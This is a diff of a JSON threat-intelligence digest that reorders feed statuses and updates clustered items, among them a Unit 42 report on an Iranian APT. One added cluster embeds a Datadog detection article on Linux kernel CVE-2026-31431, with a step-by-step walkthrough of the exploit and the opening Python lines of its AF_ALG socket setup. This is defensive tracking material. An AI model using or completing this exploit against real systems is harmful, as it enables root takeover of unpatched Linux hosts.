@@ -1,14 +1,14 @@
 {
-  "generated_at": "2026-05-28T19:50:33.361119+00:00",
+  "generated_at": "2026-05-28T20:06:08.831355+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_feeds": 80,
   "feeds_ok": 79,
-  "total_items_in_window": 430,
-  "total_clusters_raw": 369,
+  "total_items_in_window": 429,
+  "total_clusters_raw": 367,
   "total_clusters_in_packet": 80,
-  "dropped_low_score": 273,
-  "dropped_overflow": 16,
+  "dropped_low_score": 270,
+  "dropped_overflow": 17,
   "cohort_metadata": {
     "threat_research_primary": {
       "description": "Primary vendor and research-team intelligence with strong technical depth.",
@@ -67,13 +67,6 @@
     }
   },
   "feed_status": {
-    "Unit 42": {
-      "url": "https://unit42.paloaltonetworks.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 4
-    },
     "CrowdStrike": {
       "url": "https://www.crowdstrike.com/blog/feed/",
       "cohort": "threat_research_primary",
@@ -81,11 +74,25 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Trend Micro Research": {
-      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
+    "Unit 42": {
+      "url": "https://unit42.paloaltonetworks.com/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 24,
+      "item_count": 15,
+      "in_window_count": 4
+    },
+    "Google Threat Analysis Group": {
+      "url": "https://blog.google/threat-analysis-group/rss/",
+      "cohort": "threat_research_primary",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "SentinelOne Labs": {
+      "url": "https://www.sentinelone.com/labs/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
       "in_window_count": 0
     },
     "Microsoft Security Blog": {
@@ -95,11 +102,11 @@
       "item_count": 10,
       "in_window_count": 5
     },
-    "SentinelOne Labs": {
-      "url": "https://www.sentinelone.com/labs/feed/",
+    "Trend Micro Research": {
+      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 10,
+      "item_count": 24,
       "in_window_count": 0
     },
     "Microsoft Threat Intelligence": {
@@ -109,25 +116,11 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "Google Threat Analysis Group": {
-      "url": "https://blog.google/threat-analysis-group/rss/",
-      "cohort": "threat_research_primary",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Check Point Research": {
-      "url": "https://research.checkpoint.com/feed/",
+    "Citizen Lab": {
+      "url": "https://citizenlab.ca/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 15,
-      "in_window_count": 3
-    },
-    "NCSC UK": {
-      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
-      "cohort": "government_authoritative",
-      "status": "ok",
-      "item_count": 20,
+      "item_count": 10,
       "in_window_count": 1
     },
     "Kaspersky Securelist": {
@@ -144,26 +137,12 @@
       "item_count": 15,
       "in_window_count": 3
     },
-    "SANS Internet Storm Center": {
-      "url": "https://isc.sans.edu/rssfeed_full.xml",
+    "NCSC UK": {
+      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
       "cohort": "government_authoritative",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
-    },
-    "Citizen Lab": {
-      "url": "https://citizenlab.ca/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
+      "item_count": 20,
       "in_window_count": 1
-    },
-    "ESET WeLiveSecurity": {
-      "url": "https://www.welivesecurity.com/en/rss/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 3
     },
     "Sekoia": {
       "url": "https://blog.sekoia.io/feed/",
@@ -172,12 +151,26 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Volexity": {
-      "url": "https://www.volexity.com/feed/",
-      "cohort": "threat_research_primary",
+    "SANS Internet Storm Center": {
+      "url": "https://isc.sans.edu/rssfeed_full.xml",
+      "cohort": "government_authoritative",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 0
+      "in_window_count": 10
+    },
+    "Check Point Research": {
+      "url": "https://research.checkpoint.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 3
+    },
+    "ESET WeLiveSecurity": {
+      "url": "https://www.welivesecurity.com/en/rss/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 3
     },
     "Horizon3 Attack Research": {
       "url": "https://horizon3.ai/feed/",
@@ -186,32 +179,11 @@
       "item_count": 10,
       "in_window_count": 3
     },
-    "Red Canary": {
-      "url": "https://redcanary.com/feed/",
-      "cohort": "detection_response_operations",
+    "Volexity": {
+      "url": "https://www.volexity.com/feed/",
+      "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 3
-    },
-    "Assetnote": {
-      "url": "https://www.assetnote.io/resources/research/rss.xml",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 78,
-      "in_window_count": 0
-    },
-    "Exploit-DB": {
-      "url": "https://www.exploit-db.com/rss.xml",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 13
-    },
-    "PortSwigger Research": {
-      "url": "https://portswigger.net/research/rss",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 40,
       "in_window_count": 0
     },
     "Recorded Future": {
@@ -221,6 +193,41 @@
       "item_count": 50,
       "in_window_count": 0
     },
+    "GitHub Security Lab": {
+      "url": "https://github.blog/category/security/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
+    "Red Canary": {
+      "url": "https://redcanary.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 3
+    },
+    "Exploit-DB": {
+      "url": "https://www.exploit-db.com/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 13
+    },
+    "Assetnote": {
+      "url": "https://www.assetnote.io/resources/research/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 78,
+      "in_window_count": 0
+    },
+    "PortSwigger Research": {
+      "url": "https://portswigger.net/research/rss",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 40,
+      "in_window_count": 0
+    },
     "watchTowr Labs": {
       "url": "https://labs.watchtowr.com/rss/",
       "cohort": "offensive_vulnerability_research",
@@ -228,9 +235,9 @@
       "item_count": 15,
       "in_window_count": 0
     },
-    "GitHub Security Lab": {
-      "url": "https://github.blog/category/security/feed/",
-      "cohort": "offensive_vulnerability_research",
+    "Active Countermeasures": {
+      "url": "https://www.activecountermeasures.com/feed/",
+      "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 0
@@ -242,12 +249,12 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Active Countermeasures": {
-      "url": "https://www.activecountermeasures.com/feed/",
+    "TrustedSec": {
+      "url": "https://www.trustedsec.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 0
+      "in_window_count": 1
     },
     "Proofpoint Threat Insight": {
       "url": "https://www.proofpoint.com/us/rss.xml",
@@ -256,12 +263,12 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "TrustedSec": {
-      "url": "https://www.trustedsec.com/feed/",
+    "Sophos X-Ops": {
+      "url": "https://news.sophos.com/en-us/category/threat-research/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
+      "item_count": 15,
+      "in_window_count": 0
     },
     "Elastic Security Labs": {
       "url": "https://www.elastic.co/security-labs/rss/feed.xml",
@@ -269,13 +276,6 @@
       "status": "ok",
       "item_count": 20,
       "in_window_count": 1
-    },
-    "Sophos X-Ops": {
-      "url": "https://news.sophos.com/en-us/category/threat-research/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 0
     },
     "SpecterOps": {
       "url": "https://medium.com/feed/specter-ops-posts",
@@ -289,34 +289,6 @@
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 30,
-      "in_window_count": 0
-    },
-    "Trail of Bits": {
-      "url": "https://blog.trailofbits.com/feed/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
-    "Rapid7": {
-      "url": "https://www.rapid7.com/blog/rss/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 4
-    },
-    "AWS Security Blog": {
-      "url": "https://aws.amazon.com/blogs/security/feed/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 4
-    },
-    "Huntress": {
-      "url": "https://www.huntress.com/blog/rss.xml",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 100,
       "in_window_count": 1
     },
     "Orca Security Research": {
@@ -326,12 +298,40 @@
       "item_count": 10,
       "in_window_count": 8
     },
+    "AWS Security Blog": {
+      "url": "https://aws.amazon.com/blogs/security/feed/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 3
+    },
     "Permiso Security": {
       "url": "https://permiso.io/blog/rss.xml",
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 0
+    },
+    "Rapid7": {
+      "url": "https://www.rapid7.com/blog/rss/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 4
+    },
+    "Trail of Bits": {
+      "url": "https://blog.trailofbits.com/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
+    },
+    "Huntress": {
+      "url": "https://www.huntress.com/blog/rss.xml",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
     },
     "Protect AI": {
       "url": "https://protectai.com/blog/rss.xml",
@@ -340,19 +340,19 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Sysdig": {
-      "url": "https://sysdig.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 3
-    },
     "Cloudflare Security": {
       "url": "https://blog.cloudflare.com/tag/security/rss/",
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 0
+    },
+    "Sysdig": {
+      "url": "https://sysdig.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 3
     },
     "Wiz Research": {
       "url": "https://www.wiz.io/feed/rss.xml",
@@ -368,12 +368,12 @@
       "item_count": 100,
       "in_window_count": 0
     },
-    "Google Cloud Security": {
-      "url": "https://cloudblog.withgoogle.com/rss/",
-      "cohort": "cloud_identity_infrastructure",
+    "OpenSSF Blog": {
+      "url": "https://openssf.org/feed/",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 14
+      "item_count": 10,
+      "in_window_count": 1
     },
     "Cloudflare Radar": {
       "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
@@ -382,26 +382,12 @@
       "item_count": 20,
       "in_window_count": 1
     },
-    "OpenSSF Blog": {
-      "url": "https://openssf.org/feed/",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
-    },
-    "Google Cloud Threat Intelligence": {
-      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
-      "cohort": "threat_research_primary",
+    "Google Cloud Security": {
+      "url": "https://cloudblog.withgoogle.com/rss/",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 20,
-      "in_window_count": 2
-    },
-    "Simon Willison": {
-      "url": "https://simonwillison.net/atom/everything/",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 30,
-      "in_window_count": 18
+      "in_window_count": 14
     },
     "Chainalysis": {
       "url": "https://www.chainalysis.com/blog/feed/",
@@ -410,18 +396,11 @@
       "item_count": 10,
       "in_window_count": 3
     },
-    "The Record": {
-      "url": "https://therecord.media/feed",
-      "cohort": "cyber_news_breach_reporting",
+    "Interconnects": {
+      "url": "https://www.interconnects.ai/feed",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
-      "item_count": 5,
-      "in_window_count": 5
-    },
-    "GreyNoise": {
-      "url": "https://www.greynoise.io/blog/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 100,
+      "item_count": 20,
       "in_window_count": 1
     },
     "BleepingComputer": {
@@ -431,12 +410,40 @@
       "item_count": 15,
       "in_window_count": 15
     },
-    "Interconnects": {
-      "url": "https://www.interconnects.ai/feed",
+    "GreyNoise": {
+      "url": "https://www.greynoise.io/blog/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
+    },
+    "AI Snake Oil": {
+      "url": "https://www.aisnakeoil.com/feed",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 1
+    },
+    "Simon Willison": {
+      "url": "https://simonwillison.net/atom/everything/",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 30,
+      "in_window_count": 17
+    },
+    "The Record": {
+      "url": "https://therecord.media/feed",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 5,
+      "in_window_count": 5
+    },
+    "Google Cloud Threat Intelligence": {
+      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 2
     },
     "Coveware": {
       "url": "https://www.coveware.com/blog?format=rss",
@@ -459,13 +466,6 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Black Hills Information Security": {
-      "url": "https://www.blackhillsinfosec.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
-    },
     "Help Net Security": {
       "url": "https://www.helpnetsecurity.com/feed/",
       "cohort": "cyber_news_breach_reporting",
@@ -473,19 +473,12 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "AI Snake Oil": {
-      "url": "https://www.aisnakeoil.com/feed",
-      "cohort": "ai_security_agentic_risk",
+    "Black Hills Information Security": {
+      "url": "https://www.blackhillsinfosec.com/feed/",
+      "cohort": "detection_response_operations",
       "status": "ok",
-      "item_count": 20,
+      "item_count": 100,
       "in_window_count": 1
-    },
-    "Dark Reading": {
-      "url": "https://www.darkreading.com/rss.xml",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 21
     },
     "Schneier on Security": {
       "url": "https://www.schneier.com/feed/atom/",
@@ -494,19 +487,19 @@
       "item_count": 10,
       "in_window_count": 4
     },
+    "Dark Reading": {
+      "url": "https://www.darkreading.com/rss.xml",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 21
+    },
     "Team Cymru": {
       "url": "https://www.team-cymru.com/post/rss.xml",
       "cohort": "ransomware_ecrime_financial_crime",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 1
-    },
-    "Troy Hunt": {
-      "url": "https://www.troyhunt.com/rss/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 2
     },
     "Krebs on Security": {
       "url": "https://krebsonsecurity.com/feed/",
@@ -515,19 +508,19 @@
       "item_count": 10,
       "in_window_count": 3
     },
+    "Troy Hunt": {
+      "url": "https://www.troyhunt.com/rss/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 2
+    },
     "Intel 471": {
       "url": "https://intel471.com/blog/feed",
       "cohort": "ransomware_ecrime_financial_crime",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 1
-    },
-    "Graham Cluley": {
-      "url": "https://grahamcluley.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 3
     },
     "Infosecurity Magazine": {
       "url": "https://www.infosecurity-magazine.com/rss/news/",
@@ -543,19 +536,12 @@
       "item_count": 50,
       "in_window_count": 38
     },
-    "Embrace the Red": {
-      "url": "https://embracethered.com/blog/index.xml",
-      "cohort": "ai_security_agentic_risk",
+    "Graham Cluley": {
+      "url": "https://grahamcluley.com/feed/",
+      "cohort": "practitioner_analysis",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
-    },
-    "Reddit r/netsec": {
-      "url": "https://www.reddit.com/r/netsec/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 25,
-      "in_window_count": 23
+      "item_count": 20,
+      "in_window_count": 3
     },
     "Reddit r/blueteamsec": {
       "url": "https://www.reddit.com/r/blueteamsec/.rss",
@@ -571,12 +557,40 @@
       "item_count": 25,
       "in_window_count": 25
     },
+    "Reddit r/netsec": {
+      "url": "https://www.reddit.com/r/netsec/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 25,
+      "in_window_count": 23
+    },
+    "Embrace the Red": {
+      "url": "https://embracethered.com/blog/index.xml",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 0
+    },
     "tl;dr sec": {
       "url": "https://tldrsec.com/feed.xml",
       "cohort": "practitioner_analysis",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 1
+    },
+    "Reddit r/msp": {
+      "url": "https://www.reddit.com/r/msp/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 25,
+      "in_window_count": 25
+    },
+    "Reddit r/netsecstudents": {
+      "url": "https://www.reddit.com/r/netsecstudents/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 25,
+      "in_window_count": 13
     },
     "Risky Business News": {
       "url": "https://risky.biz/feeds/risky-business-news/",
@@ -591,20 +605,6 @@
       "status": "ok",
       "item_count": 25,
       "in_window_count": 24
-    },
-    "Reddit r/netsecstudents": {
-      "url": "https://www.reddit.com/r/netsecstudents/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 25,
-      "in_window_count": 13
-    },
-    "Reddit r/msp": {
-      "url": "https://www.reddit.com/r/msp/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 25,
-      "in_window_count": 25
     },
     "Reddit r/AskNetsec": {
       "url": "https://www.reddit.com/r/AskNetsec/.rss",
@@ -2512,9 +2512,13 @@
           "UNC1549"
         ],
         "affected_industries": [
-          "aviation_defense"
+          "aviation_defense",
+          "manufacturing_industrial",
+          "telecommunications"
         ],
-        "affected_products": [],
+        "affected_products": [
+          "Palo Alto Networks"
+        ],
         "tools_used": [],
         "cve_ids": [],
         "attack_techniques": [],
@@ -2534,24 +2538,34 @@
         "link": "https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/",
         "published": "2026-05-22T13:00:42+00:00",
         "summary": "Unit 42 details Screening Serpens' use of AppDomainManager hijacking and new RAT variants to target tech and defense sectors in recent campaigns. The post Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns appeared first on Unit 42 .",
-        "full_body": "",
-        "fetch_status": "fetch_failed:ReadTimeout",
+        "full_body": "Threat Research Center Threat Actor Groups Malware Malware Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns 20 min read Related Products Advanced DNS Security Advanced URL Filtering Advanced WildFire Cloud-Delivered Security Services Cortex Cortex Cloud Cortex XDR Cortex XSIAM Unit 42 Incident Response By: Unit 42 Published: May 22, 2026 Categories: Malware Threat Actor Groups Tags: Advanced Persistent Threat AppDomainManager DLL Sideloading Iran MiniJunk MiniUpdate Operation security RATs Screening serpens Social engineering Share Executive Summary Unit 42 researchers have observed evidence of cyberattacks by the Iran-nexus advanced persistent threat (APT) group Screening Serpens (aka UNC1549, Smoke Sandstorm and Iranian Dream Job). Based on our visibility, we believe that the group targeted entities in the U.S., Israel and the United Arab Emirates, and likely two additional Middle Eastern entities. This research follows an evolution through cyberattacks in mid-February through April 2026. The timing of these campaigns aligns closely with that of the regional conflict that started in the Middle East on Feb. 28, 2026. We discovered six new remote access Trojan (RAT) variants developed and deployed between February and April 2026. Screening Serpens has been active since at least 2022. Their recent activity demonstrates an increase in technical capabilities and operational resilience. Screening Serpens primarily targets technology sector professionals, using highly tailored social engineering. The group frequently uses personalized recruitment lures that impersonate trusted brands and hiring platforms, to trick targets into initiating the infection chain. We assess with moderate-high confidence that the campaigns discussed in this article are conducted by Screening Serpens. The group has maintained a consistently high operational tempo throughout March and April 2026. We have grouped the six newly discovered RAT variants into two new malware families that were deployed in concurrent espionage campaigns. Based on the timing of deployment, our analysis indicates two sets of coordinated cyberattacks. At least one variant was compiled and deployed with specific timing instructions. Our analysis reveals a continuous cycle of development and deployment, characterized by specialized and upgraded variants with diverse functionalities, as shown in each targeted campaign. The most critical evolution in the group’s recent campaign uses a technique called AppDomainManager hijacking. This hijack method manipulates the initialization phase of .NET applications to proactively disable the application’s own security mechanisms via a legitimate configuration file. The disabled security in these apps left the targeted entities vulnerable to the deployed multi-functional RATs. Palo Alto Networks customers are better protected from the threats described in this article through the following products and services: Advanced WildFire Advanced URL Filtering and Advanced DNS Security Cortex XDR and XSIAM Cortex Cloud Cortex AgentiX Agentic Assistant can assist teams in investigating incidents. If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics Advanced Persistent Threat (APT) , Malware , Cyberespionage , RATs S creening Serpens Overview Screening Serpens is an Iran-nexus APT group operating as a cyberespionage group aligned with Iranian intelligence objectives. While historically focused on regional targets in the Middle East, the group gained industry attention in late 2025 when Check Point Research detailed its strategic expansion into Western Europe . During these campaigns, Screening Serpens consistently set its sights on high-value sectors, heavily targeting aerospace, defense manufacturing and telecommunications organizations. These operations are characterized by targeted social engineering campaigns, using lures designed specifically to trick j",
+        "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
+            "phishing_social_eng",
             "apt_espionage"
           ],
           "actor_attribution": [
-            "Nimbus Manticore"
+            "Nimbus Manticore",
+            "UNC1549"
           ],
-          "affected_industries": [],
-          "affected_products": [],
+          "affected_industries": [
+            "manufacturing_industrial",
+            "telecommunications",
+            "aviation_defense"
+          ],
+          "affected_products": [
+            "Palo Alto Networks"
+          ],
           "tools_used": [],
           "cve_ids": [],
           "attack_techniques": [],
           "urgency_signals": [],
           "content_type": "news_report",
           "confidence_tier": "tier_1_primary_research",
-          "role_map": {},
+          "role_map": {
+            "Palo Alto Networks": "target"
+          },
           "weak_tags": {
             "products": []
           }
@@ -2567,20 +2581,30 @@
           "summary": "Unit 42 details Screening Serpens' use of AppDomainManager hijacking and new RAT variants to target tech and defense sectors in recent campaigns. The post Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns appeared first on Unit 42 .",
           "taxonomy": {
             "threat_categories": [
+              "phishing_social_eng",
               "apt_espionage"
             ],
             "actor_attribution": [
-              "Nimbus Manticore"
+              "Nimbus Manticore",
+              "UNC1549"
             ],
-            "affected_industries": [],
-            "affected_products": [],
+            "affected_industries": [
+              "manufacturing_industrial",
+              "telecommunications",
+              "aviation_defense"
+            ],
+            "affected_products": [
+              "Palo Alto Networks"
+            ],
             "tools_used": [],
             "cve_ids": [],
             "attack_techniques": [],
             "urgency_signals": [],
             "content_type": "news_report",
             "confidence_tier": "tier_1_primary_research",
-            "role_map": {},
+            "role_map": {
+              "Palo Alto Networks": "target"
+            },
             "weak_tags": {
               "products": []
             }
@@ -3595,6 +3619,117 @@
       ]
     },
     {
+      "cluster_id": "101998c91d",
+      "priority_score": 16,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [
+        "CVE-2026-31431"
+      ],
+      "taxonomy": {
+        "threat_categories": [
+          "active_exploitation"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services"
+        ],
+        "affected_products": [
+          "Linux kernel"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-31431"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "actively_exploited"
+        ],
+        "content_type": [
+          "vulnerability_disclosure"
+        ],
+        "confidence_tier": [
+          "tier_2_operator"
+        ]
+      },
+      "primary": {
+        "source": "Datadog Security Labs",
+        "cohort": "cloud_identity_infrastructure",
+        "title": "From Exploit Code to Production Detection: Building a CVE-2026-31431 (Copy Fail) detection with Agents",
+        "link": "https://securitylabs.datadoghq.com/articles/cve-2026-31431-copy-fail-exploit-detection-with-agents/",
+        "published": "2026-05-28T00:00:00+00:00",
+        "summary": "CVE-2026-31431 (Copy Fail) lets any unprivileged user corrupt the Linux page cache via AF_ALG sockets to escalate privileges. This post covers the exploit mechanics and how Datadog Security Research used coding agents to ship a detection content pack in a single session.",
+        "full_body": "Ryan Simon Senior Security Engineer Key points CVE-2026-31431 (CVSS 7.8 HIGH) allows any unprivileged local user to corrupt the page caches via AF_ALG sockets and the authencesn AEAD template to escalate privileges to execute code as root. The vulnerability affects a wide range of kernel versions, from 4.14 through 6.19 and 7.0 release candidates. This is not limited to recent kernels. The corruption happens entirely within kernel space: no VFS writes, no mtime changes, no audit trail. It avoids normal file-write visibility. CISA added this to the Known Exploited Vulnerabilities (KEV) catalog on May 1, 2026. Active exploitation in the wild has since been confirmed. This post walks through the exploit mechanics and looks back at how Datadog Security Research used coding agents to compress the full detection engineering cycle into a single session, from initial threat analysis to shipped detections, in hours. Background: Page cache, AF_ALG, and splice() Before we examine the exploit in detail, let's establish three kernel concepts it relies on. If you're already familiar with these, feel free to jump to how the exploit works . The page cache The Linux kernel uses the page cache to hold file-backed data in memory. When a file is first read from disk, its contents are loaded into page cache pages indexed by inode and offset. Any later read requests, originating from either the initial process or a separate one, are fulfilled using memory, bypassing the disk entirely. Execution works the same way. When the kernel runs /usr/bin/su , it memory-maps the binary's page cache pages directly into the process address space. The CPU executes from those in-memory pages, not from disk. AF_ALG: The Kernel Crypto API The Linux kernel exposes its internal cryptography operations to userspace through AF_ALG (Address Family: Algorithm) sockets. A program creates an AF_ALG socket, binds it to a specific algorithm, configures it with setsockopt() , and sends data for encryption or decryption. The exploit focuses on the authencesn algorithm template which manages sequence numbers while integrating AES-CBC encryption and HMAC-SHA256 authentication. Importantly, creating and using AF_ALG sockets requires no special privileges. Any unprivileged user can access the kernel's crypto subsystem. splice(): Zero-copy data movement splice() facilitates zero-copy data transfers between file descriptors by bypassing userspace. When a file is spliced into a pipe, the kernel avoids copying data and instead maps the actual page cache pages into the pipe. As a result, the pipe establishes direct links to the identical memory pages that the source file occupies. This zero-copy optimization is key to the exploit: after splicing, the crypto subsystem holds references to the actual page cache pages of the target file, not copies. How the exploit works, step by step The exploit chains together the three mechanisms above to achieve a controlled write into the page cache of any file readable by the attacker. Let's walk through each stage. Stage 1: Create and configure the crypto socket The exploit begins by creating an AF_ALG socket. AF_ALG is the Linux interface that lets userspace programs ask the kernel to perform cryptographic operations. In this case, the exploit uses the AEAD algorithm authencesn(hmac(sha256),cbc(aes)) . This setup does not require root privileges. An unprivileged process can create the socket, bind it to the algorithm, configure the required options, and call accept() to create an operation socket. That operation socket is what the exploit uses for the later decrypt request. import socket ctrl_sock = socket . socket ( socket . AF_ALG , socket . SOCK_SEQPACKET , 0 ) ctrl_sock . bind ( ( \"aead\" , \"authencesn(hmac(sha256),cbc(aes))\" ) ) key = get_valid_authencesn_key ( ) ctrl_sock . setsockopt ( socket . SOL_ALG , socket . ALG_SET_KEY , key ) authsize = 4 ctrl_sock . setsockopt ( socket . SOL_ALG , socket . ALG_SET_AEAD_AUTHSIZE , authsize , ) op_sock ,",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "active_exploitation"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "financial_services"
+          ],
+          "affected_products": [
+            "Linux kernel"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2026-31431"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "actively_exploited"
+          ],
+          "content_type": "vulnerability_disclosure",
+          "confidence_tier": "tier_2_operator",
+          "role_map": {
+            "Linux kernel": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Datadog Security Labs",
+          "cohort": "cloud_identity_infrastructure",
+          "title": "From Exploit Code to Production Detection: Building a CVE-2026-31431 (Copy Fail) detection with Agents",
+          "link": "https://securitylabs.datadoghq.com/articles/cve-2026-31431-copy-fail-exploit-detection-with-agents/",
+          "published": "2026-05-28T00:00:00+00:00",
+          "summary": "CVE-2026-31431 (Copy Fail) lets any unprivileged user corrupt the Linux page cache via AF_ALG sockets to escalate privileges. This post covers the exploit mechanics and how Datadog Security Research used coding agents to ship a detection content pack in a single session.",
+          "taxonomy": {
+            "threat_categories": [
+              "active_exploitation"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "financial_services"
+            ],
+            "affected_products": [
+              "Linux kernel"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-31431"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "actively_exploited"
